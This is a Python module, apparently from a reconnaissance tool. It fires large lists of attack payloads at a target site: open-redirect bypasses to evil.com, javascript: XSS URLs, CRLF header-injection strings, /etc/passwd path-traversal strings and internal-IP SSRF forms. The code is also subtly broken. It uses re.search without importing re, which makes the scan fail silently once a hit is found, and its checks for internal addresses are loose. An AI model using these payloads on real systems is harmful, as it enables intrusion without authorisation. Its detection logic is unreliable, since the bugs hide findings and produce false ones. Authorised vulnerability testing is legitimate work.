import httpx
from urllib.parse import urlparse, urlencode, quote, parse_qs, urljoin
from models import IntelligenceFinding

REDIRECT_PARAMS = [
    "url", "redirect", "return", "next", "target", "dest", "destination",
    "go", "forward", "to", "link", "linkto", "page", "file", "doc",
    "document", "folder", "root", "image", "img", "browse", "load",
    "read", "view", "file_path", "location", "path", "continue",
    "follow", "rurl", "rd", "rdurl", "redir", "redirect_uri",
    "redirect_url", "ReturnUrl", "ReturnPath", "redirect-to",
    "redirectto", "redirect_", "redirectPath", "redirect_path",
    "out", "external", "source", "from", "callback", "cback",
    "ref", "referer", "referrer", "back", "done", "success",
    "failure", "error", "cancel", "cancel_url", "fail",
    "return_url", "return_to", "return-path", "redirectUrl",
    "redirectTo", "next_url", "nextUrl", "next-path", "goto",
    "gourl", "goUrl", "go_to", "rdr", "redir_url", "redirecturl",
    "redirect_uri", "redirect_url", "redirecttarget", "redir_target",
    "rurl", "ru", "return_path", "retpath", "retpath_url",
    "service", "services", "u", "i", "r", "p", "q", "s",
    "action", "site", "host", "server", "domain",
    "callback_url", "cb", "cburl", "continue_url",
    "returnto", "returnurl", "returnUrl", "returnPath",
    "nav", "navigate", "navigation", "href", "rel",
    "redirectUrl", "redirectPath", "redirectUrlPath",
    "forwardUrl", "forwardurl", "forward_url",
    "redirectpage", "redirect_page", "redirectpath",
    "returnpath", "return_path", "returnpathurl",
    "nextPage", "next_page", "nextpage",
    "redirectType", "redirect_type",
    "logout", "login", "signout", "signin",
    "profile", "account", "setting",
    "home", "main", "index", "default",
    "fallback", "failure_url", "success_url",
    "error_url", "cancel_url", "complete_url",
    "approval_url", "decline_url",
    "request", "response", "respond",
    "relay", "relay_url", "relayurl",
    "proxy", "proxy_url", "proxyurl",
    "gateway", "intermediate",
    "asset", "assets", "resource",
    "static", "media", "upload",
    "download", "stream", "preview",
    "thumbnail", "avatar", "icon",
    "css", "js", "script",
    "module", "chunk", "bundle",
    "worker", "sw", "serviceworker",
    "manifest", "json", "xml",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "//evil.com/",
    "///evil.com",
    "https://evil.com@good.com",
    "https://evil.com.good.com",
    "https://good.com@evil.com",
    "//good.com@evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:alert(1)",
    "%0d%0aLocation:%20https://evil.com",
    "%0aLocation:%20https://evil.com",
    "/%5cevil.com",
    "/%2eevil%2ecom/",
    "https://evil.com%23.good.com/",
    ".evil.com",
    "@evil.com",
    "../evil.com",
    "/..;/evil.com",
    "\\evil.com",
    "//evil.com:443@good.com",
    "https://evil.com:443",
    "http://evil.com:80",
    "//evil.com:80",
    "///evil.com:443",
    "https://evil.com/",
    "http://evil.com/",
    "https://evil.com#",
    "https://evil.com?",
    "https://evil.com%00",
    "https://evil.com%0d%0a",
    "%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
    "https://evil%2ecom",
    "https://evil%2ecom%2f",
    "//evil%2ecom",
    "/%2e%2e/%2e%2e/%2e%2e/evil.com",
    "/..;/..;/..;/evil.com",
    "/%2e%2e%2f%2e%2e%2f%2e%2e%2fevil%2ecom",
    "/..\\;..\\/../evil.com",
    "https://evil.com;good.com",
    "https://evil.com,good.com",
    "https://evil.com|good.com",
    "https://evil.com/good.com",
    "https://evil.com:443@127.0.0.1",
    "https://evil.com:443@0x7f000001",
    "https://evil.com:443@2130706433",
    "https://evil.com:443@[::1]",
    "https://evil.com:443@0.0.0.0",
    "https://evil.com:443@localhost",
    "https://0x7f000001",
    "https://0x7f000001:443",
    "https://2130706433",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://127.0.0.1",
    "http://[::1]",
    "http://0.0.0.0",
    "https://localhost",
    "https://internal.localhost",
    "https://evil.com:443/",
    "//evil.com:443//",
    "///evil.com:443//",
    "https://evil.com\\@good.com",
    "https://evil.com\\.good.com",
    "https://good.com\\@evil.com",
    "https://good.com\\.evil.com",
    "https://evil.com\\good.com",
    "https://good.com\\evil.com",
    "https://evil.com/.good.com",
    "https://evil.com\\.good.com",
    "https://good.com/.evil.com",
    "https://good.com\\.evil.com",
    "https://evil.com%0agood.com",
    "https://evil.com%0dgood.com",
    "https://evil.com%09good.com",
    "https://evil.com%0agood.com%2f",
    "///evil.com:443@127.0.0.1",
    "https://evil.com:443@0",
    "https://evil.com:443@127.1",
    "https://evil.com:443@0x7f.1",
    "https://evil.com:443@0177.1",
    "//evil.com:443@0x7f000001",
    "https://evil.com:443@0x7f000001:443",
    "//evil.com:443@0",
    "https://good.com:443@evil.com:443@127.0.0.1",
    "https://evil.com%252fgood.com",
    "//evil.com%252fgood.com",
    "https://evil.com%23%23.good.com",
]

CRLF_PAYLOADS = [
    "%0d%0aX-Injected:%20true",
    "%0aX-Injected:%20true",
    "%0d%0aSet-Cookie:%20test=crlf",
    "%0d%0a%0d%0a<html><script>alert(1)</script></html>",
    "%0d%0aLocation:%20https://evil.com%0d%0a%0d%0a",
    "%0a%0a<script>alert(1)</script>",
    "%0d%0aX-XSS-Protection:%200%0d%0a",
    "%0d%0aContent-Length:%200%0d%0a%0d%0a",
]

PATH_TRAVERSAL_PAYLOADS = [
    "/../../../etc/passwd",
    "/..%252f..%252f..%252fetc/passwd",
    "/....//....//....//etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/..\\;/..\\;/..\\;/etc/passwd",
    "/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/..%252f..%252f..%252f..%252fetc/passwd",
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "/..%5c..%5c..%5cetc/passwd",
    "/..\\..\\..\\etc/passwd",
    "/../.../....///etc/passwd",
]

DOMAIN_BYPASS_PAYLOADS = [
    "https://evil.com",
    "http://evil.com",
    "//evil.com",
    "https://evil.com/?good.com",
    "https://evil.com%23good.com",
    "https://good.com%40evil.com",
    "https://evil.com.good.com",
    "https://evil.com%2egood.com",
    "https://evil.com%2fgood.com",
    "https://good.com.evil.com",
    "https://good.com/..@evil.com",
    "https://good\\.com@evil.com",
    "https://evil.com:443@good.com",
    "https://good.com:443@evil.com",
    "https://evil.com/?dest=good.com",
    "https://good.com%2eevil.com",
    "https://evil%2dgood.com",
    "https://good%2eevil.com",
    "https://[::1]:443/",
    "https://0x7f000001:443/",
    "https://2130706433:443/",
    "https://evil.com#good.com",
    "https://evil.com?good.com",
    "//evil.com#good.com",
    "//evil.com?good.com",
    "https://evil.com;good.com",
    "https://evil.com,good.com",
    "https://evil.com:443@127.0.0.1",
    "https://0",
    "https://0x0",
    "https://0.0.0.0",
    "https://localhost",
    "https://internal",
    "//evil%2ecom",
    "//.evil.com",
    "///evil.com",
    "///evil.com:443",
    "https://evil%2Ecom",
    "https://eVIl.CoM",
    "https://EVIL.COM",
    "https://evil.com:443=good.com",
    "https://good.com&evil.com",
    "https://evil.com@good.com",
    "https://good.com:443@evil.com:443@good.com",
    "//evil%2ecom%2f",
    "///evil%2ecom",
    "///evil%2ecom:443",
    "/..;/..;/..;/evil.com",
    "/%2e%2e%2fevil%2ecom",
    "/..\\..\\..\\evil.com",
    "https://evil%2dgood.com",
    "https://good%2eevil.com",
    "https://127.0.0.1",
    "https://10.0.0.1",
    "https://172.16.0.1",
    "https://192.168.1.1",
    "https://0x7f000001",
    "https://0xA9FEA9",
    "https://0xA9FEA9:443",
]

DOMAIN_BYPASS_PATTERNS = {
    "URL Scheme Bypass": r"^(https?://|//)",
    "Protocol Relative": r"^//",
    "CRLF Injection": r"%0[dD]%0[aA]|%0[aA]",
    "Unicode Bypass": r"%c0%ae|%uff0e|%u2215",
    "Double Encoding": r"%252f|%252e%252e",
    "Backslash Bypass": r"\\\\|%5c",
    "At Sign Bypass": r"@",
    "Hex IP Bypass": r"0x[0-9a-fA-F]{2,}",
    "Decimal IP Bypass": r"\b\d{10,}\b",
    "IPv6 Localhost": r"\[::1\]|0:0:0:0:0:0:0:1",
    "Newline Injection": r"%0a|%0d",
    "Null Byte": r"%00",
    "Dot Bypass": r"%2e|%252e",
    "Fragment Bypass": r"#",
    "Question Mark Bypass": r"\?",
}

async def test_redirect_param(base_url, param, payload, client):
    test_url = f"{base_url}?{param}={quote(payload)}"
    try:
        resp = await client.get(test_url, timeout=5.0,
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"},
            follow_redirects=False)
        location = resp.headers.get("location", "")
        if location:
            if "evil.com" in location.lower() or "evil" in location.lower():
                return resp.status_code, location, True
            if location.startswith("javascript:") or location.startswith("data:") or location.startswith("vbscript:"):
                return resp.status_code, location, True
            if "alert" in location.lower():
                return resp.status_code, location, True
            if resp.status_code in (301, 302, 303, 307, 308) and "evil" in location.lower():
                return resp.status_code, location, True
            if "127.0.0.1" in location or "localhost" in location or "10." in location or "192.168" in location:
                return resp.status_code, location, True
        return resp.status_code, location, False
    except Exception:
        return 0, "", False

async def check_redirect_footprint(base_url, client):
    try:
        resp = await client.get(base_url, follow_redirects=False, timeout=5.0,
            headers={"User-Agent": "Mozilla/5.0"})
        return resp.status_code, dict(resp.headers)
    except Exception:
        return 0, {}

async def crawl(target: str, client: httpx.AsyncClient):
    findings = []
    base_url = f"https://{target}" if not target.startswith("http") else target
    if base_url.endswith("/"):
        base_url = base_url[:-1]

    try:
        base_status, base_headers = await check_redirect_footprint(base_url, client)
        is_auth_required = base_status in (401, 403, 302) and "login" in base_headers.get("location", "").lower()
        found_vulnerabilities = []
        bypass_types_found = set()

        for param in REDIRECT_PARAMS:
            for payload in DOMAIN_BYPASS_PAYLOADS:
                status, location, is_open = await test_redirect_param(base_url, param, payload, client)
                if is_open:
                    key = f"{param}={payload}"
                    if key not in found_vulnerabilities:
                        found_vulnerabilities.append(key)
                        severity = "Critical" if is_auth_required else "High Risk"
                        for bypass_name, bypass_pattern in DOMAIN_BYPASS_PATTERNS.items():
                            if re.search(bypass_pattern, payload, re.IGNORECASE):
                                bypass_types_found.add(bypass_name)
                        findings.append(IntelligenceFinding(
                            entity=f"Open redirect: ?{param}={payload[:80]} -> {location[:200]}",
                            type="Open Redirect Vulnerability",
                            source="OpenRedirectScanner",
                            confidence="High",
                            color="red",
                            threat_level=severity,
                            raw_data=f"URL: {base_url}?{param}={quote(payload)} | Status: {status} | Location: {location} | Payload: {payload}",
                            tags=["open-redirect", "vulnerability", param]
                        ))

        for param in REDIRECT_PARAMS[:60]:
            for payload in CRLF_PAYLOADS:
                status, location, is_open = await test_redirect_param(base_url, param, payload, client)
                if status in (301, 302, 303, 307, 308) and location:
                    check_url = f"{base_url}?{param}={quote(payload)}"
                    try:
                        verify = await client.get(check_url, timeout=5.0,
                            headers={"User-Agent": "Mozilla/5.0"}, follow_redirects=False)
                        verify_headers = dict(verify.headers)
                        if "X-Injected" in verify_headers or "Set-Cookie" in verify_headers:
                            findings.append(IntelligenceFinding(
                                entity=f"CRLF injection via ?{param}",
                                type="CRLF Injection (Header Splitting)",
                                source="OpenRedirectScanner",
                                confidence="High",
                                color="red",
                                threat_level="Critical",
                                raw_data=f"URL: {check_url} | Header injection detected in response",
                                tags=["crlf", "header-injection", "vulnerability"]
                            ))
                    except Exception:
                        pass

        for param in REDIRECT_PARAMS[:40]:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                status, location, is_open = await test_redirect_param(base_url, param, payload, client)
                if status == 200 and location:
                    if "root:x" in location or "etc/passwd" in location or "[extensions]" in location:
                        findings.append(IntelligenceFinding(
                            entity=f"Path traversal via ?{param} - file content leaked",
                            type="Path Traversal via Redirect",
                            source="OpenRedirectScanner",
                            confidence="High",
                            color="red",
                            threat_level="Critical",
                            raw_data=f"URL: {base_url}?{param}={quote(payload)} | Content leaked in response",
                            tags=["path-traversal", "vulnerability", param]
                        ))

        for param in REDIRECT_PARAMS[:50]:
            for payload in ["https://evil.com", "javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]:
                status, location, is_open = await test_redirect_param(base_url, param, payload, client)
                if is_open:
                    key = f"{param}={payload[:30]}"
                    if key not in found_vulnerabilities:
                        found_vulnerabilities.append(key)

        redirect_chain_check_url = f"{base_url}?redirect=https://evil.com"
        try:
            chain_resp = await client.get(redirect_chain_check_url, follow_redirects=True, timeout=10.0,
                headers={"User-Agent": "Mozilla/5.0"})
            if chain_resp.status_code == 200:
                final_url = str(chain_resp.url)
                if "evil.com" in final_url.lower() or "127.0.0.1" in final_url:
                    findings.append(IntelligenceFinding(
                        entity=f"Redirect chain leads to: {final_url[:200]}",
                        type="Open Redirect Chain Detected",
                        source="OpenRedirectScanner",
                        confidence="High",
                        color="red",
                        threat_level="Critical",
                        raw_data=f"Redirect chain: {redirect_chain_check_url} -> {final_url}",
                        tags=["open-redirect", "redirect-chain"]
                    ))
        except Exception:
            pass

        html_endpoints = ["/logout", "/login", "/redirect", "/goto", "/link", "/out"]
        for ep in html_endpoints:
            try:
                ep_resp = await client.get(f"{base_url}{ep}", follow_redirects=False, timeout=5.0,
                    headers={"User-Agent": "Mozilla/5.0"})
                if ep_resp.status_code in (301, 302, 303, 307, 308):
                    loc = ep_resp.headers.get("location", "")
                    findings.append(IntelligenceFinding(
                        entity=f"{ep} redirects to: {loc[:200]}",
                        type="Endpoint Redirect",
                        source="OpenRedirectScanner",
                        confidence="Medium",
                        color="slate",
                        threat_level="Informational",
                        raw_data=f"URL: {base_url}{ep} -> {loc}",
                        tags=["redirect", "endpoint"]
                    ))
            except Exception:
                pass

        if found_vulnerabilities:
            findings.append(IntelligenceFinding(
                entity=f"{len(found_vulnerabilities)} open redirect vectors found ({len(bypass_types_found)} bypass types)",
                type="Open Redirect Summary",
                source="OpenRedirectScanner",
                confidence="High",
                color="red",
                threat_level="Critical" if is_auth_required else "High Risk",
                raw_data=f"Vectors: {'; '.join(found_vulnerabilities[:20])} | Bypass types: {', '.join(bypass_types_found)}",
                tags=["open-redirect", "summary"]
            ))
        else:
            findings.append(IntelligenceFinding(
                entity=f"No open redirect found on {len(REDIRECT_PARAMS)} parameters, {len(DOMAIN_BYPASS_PAYLOADS)} payloads",
                type="Open Redirect Summary",
                source="OpenRedirectScanner",
                confidence="Medium",
                color="emerald",
                threat_level="Informational",
                raw_data=f"Tested {len(REDIRECT_PARAMS)} parameters with {len(DOMAIN_BYPASS_PAYLOADS)} payloads each",
                tags=["open-redirect", "summary"]
            ))

    except Exception as e:
        findings.append(IntelligenceFinding(
            entity=f"Open Redirect error: {str(e)[:100]}",
            type="Open Redirect Error",
            source="OpenRedirectScanner",
            confidence="Low",
            color="red",
            threat_level="Informational",
            tags=["error"]
        ))

    return findings
